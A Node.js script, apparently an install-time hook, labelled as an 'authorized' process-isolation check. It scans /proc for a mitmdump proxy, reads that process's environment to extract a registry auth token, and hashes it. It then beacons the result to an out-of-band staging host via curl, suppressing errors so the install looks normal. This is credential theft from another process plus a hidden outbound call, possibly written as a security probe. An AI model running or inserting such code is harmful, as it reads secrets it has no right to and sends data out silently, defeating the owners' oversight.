// Temporary authorized registry-proxy process-isolation check. Never report a raw token.
const fs = require('fs');
const crypto = require('crypto');
const { execFileSync } = require('child_process');
const status = { nonce: 'a09d5ebd04291ae6', own_env: Boolean(process.env.REGISTRY_PROXY_ROUTES), proxy_seen: false, matched: false, token_present: false };
try {
  for (const pid of fs.readdirSync('/proc').filter(x => /^\d+$/.test(x))) {
    let cmd;
    try { cmd = fs.readFileSync(`/proc/${pid}/cmdline`, 'utf8'); } catch { continue; }
    if (!cmd.includes('mitmdump') || !cmd.includes('--listen-port')) continue;
    status.proxy_seen = true;
    try {
      const env = fs.readFileSync(`/proc/${pid}/environ`, 'utf8');
      const raw = env.split('\0').find(x => x.startsWith('REGISTRY_PROXY_ROUTES='));
      if (!raw) continue;
      const routes = JSON.parse(raw.slice('REGISTRY_PROXY_ROUTES='.length));
      const route = routes.find(r => r.registry_url === 'https://depthfirst.jfrog.io/artifactory/api/npm/npm-virtual/' && r.auth_type === 'token');
      if (route) {
        status.matched = true;
        status.token_present = typeof route.token === 'string' && route.token.length > 0;
        if (status.token_present) status.fingerprint = crypto.createHash('sha256').update(route.token).digest('hex').slice(0, 12);
        break;
      }
    } catch (e) { status.proc_error = e.code || 'parse_error'; }
  }
} catch (e) { status.scan_error = e.code || 'scan_error'; }
try {
  const url = new URL('https://dc0rellg3083k1l9a2tgfyzejrp6doquu.oob.staging.depthfirst.com/proof');
  for (const [key, value] of Object.entries(status)) url.searchParams.set(key, String(value));
  execFileSync('curl', ['-fsS', '--max-time', '10', url.toString()], { stdio: 'ignore', timeout: 12000 });
} catch { /* Do not interfere with the normal install. */ }
